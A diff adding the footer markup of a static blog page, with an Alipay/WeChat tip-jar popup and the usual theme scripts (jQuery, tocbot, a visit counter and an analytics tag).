+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: false
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+  </div>
+</body>
+
+</html>
